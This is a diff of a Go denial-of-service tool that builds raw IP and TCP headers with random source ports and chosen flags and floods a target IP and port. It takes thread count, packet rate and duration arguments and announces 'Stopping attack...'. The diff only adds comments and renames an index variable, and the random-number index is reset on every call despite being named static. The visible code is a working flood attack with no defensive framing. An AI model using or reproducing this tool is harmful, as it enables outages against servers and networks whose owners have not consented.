@@ -25,6 +25,7 @@ var sleeptime uint32 = 100
 
 var ack, syn, psh, fin, rst, urg, ptr, res2, seq int
 
+// Initialize random number generator
 func initRand(seed uint32) {
 	Q[0] = seed
 	Q[1] = seed + PHI
@@ -34,22 +35,24 @@ func initRand(seed uint32) {
 	}
 }
 
+// Random number generator (Complementary-Multiply-With-Carry)
 func randCMWC() uint32 {
 	const a uint64 = 18782
 	var r uint32 = 0xfffffffe
-	i := uint32(4095)
-	i = (i + 1) & 4095
-	t := uint64(a)*uint64(Q[i]) + uint64(c)
+	staticI := uint32(4095) // Index for the static state variable
+	staticI = (staticI + 1) & 4095
+	t := uint64(a)*uint64(Q[staticI]) + uint64(c)
 	c = uint32(t >> 32)
 	x := uint32(t + uint64(c))
 	if x < c {
 		x++
 		c++
 	}
-	Q[i] = r - x
-	return Q[i]
+	Q[staticI] = r - x
+	return Q[staticI]
 }
 
+// Calculate checksum
 func checksum(data []byte) uint16 {
 	var sum uint32
 	for i := 0; i < len(data)-1; i += 2 {
@@ -64,6 +67,7 @@ func checksum(data []byte) uint16 {
 	return ^uint16(sum)
 }
 
+// Set up the IP header for the packet
 func setupIPHeader(ipHeader []byte, dstIP string) {
 	ipHeader[0] = 0x45 // version and header length
 	ipHeader[1] = 0x00 // TOS
@@ -79,6 +83,7 @@ func setupIPHeader(ipHeader []byte, dstIP string) {
 	copy(ipHeader[16:20], net.ParseIP(dstIP).To4())     // destination IP
 }
 
+// Set up the TCP header for the packet
 func setupTCPHeader(tcpHeader []byte) {
 	tcpHeader[0] = byte(randCMWC() >> 8) // source port
 	tcpHeader[1] = byte(randCMWC() & 0xff)
@@ -87,6 +92,7 @@ func setupTCPHeader(tcpHeader []byte) {
 	// TCP flags, window size, and checksum will be set later
 }
 
+// Flood function to send packets
 func flood(target string) {
 	ipHeader := make([]byte, 20)
 	tcpHeader := make([]byte, 20)
@@ -125,6 +131,7 @@ func flood(target string) {
 	}
 }
 
+// Main function to parse arguments and start the attack
 func main() {
 	if len(os.Args) < 7 {
 		fmt.Printf("Usage: %s <target IP> <port> <threads> <pps limiter, -1 for no limit> <time> <flags>\n", os.Args[0])
@@ -158,6 +165,7 @@ func main() {
 	fmt.Println("Stopping attack...")
 }
 
+// Helper to convert string to integer
 func mustAtoi(s string) int {
 	v, err := strconv.Atoi(s)
 	if err != nil {
@@ -167,6 +175,7 @@ func mustAtoi(s string) int {
 	return v
 }
 
+// Set flags for TCP options
 func setFlags(flags string) {
 	ack = boolToInt(strings.Contains(flags, "ack"))
 	syn = boolToInt(strings.Contains(flags, "syn"))
@@ -179,6 +188,7 @@ func setFlags(flags string) {
 	seq = boolToInt(strings.Contains(flags, "seq"))
 }
 
+// Helper to convert boolean to integer
 func boolToInt(b bool) int {
 	if b {
 		return 1
